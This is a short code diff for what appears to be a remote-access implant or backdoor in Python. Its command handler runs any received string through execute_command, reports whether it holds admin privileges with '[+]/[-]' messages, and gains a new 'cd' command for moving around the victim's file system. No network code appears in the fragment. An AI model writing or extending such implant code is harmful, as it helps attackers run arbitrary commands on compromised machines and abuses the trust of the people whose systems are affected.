@@ -1,14 +1,22 @@
-import subprocess, threading, ctypes
+import subprocess, threading, ctypes, os
 
 def handle_command(data):
 	command = data.split()[0]
 	arguments = " ".join(data.split()[1:])
 	if command == "test":
 		return test(arguments)
+	elif command == "cd": # Change directory
+		try:
+			os.chdir(arguments) 
+			return ""
+		except Exception as e:
+			return str(e)
+			
 	elif command == "isadmin":
 		if is_admin():
 			return "[+]Current process has admin privileges."
 		return "[-]Current process does not have admin privileges."
+		
 	else:
 		return execute_command(command + " " + arguments)
 
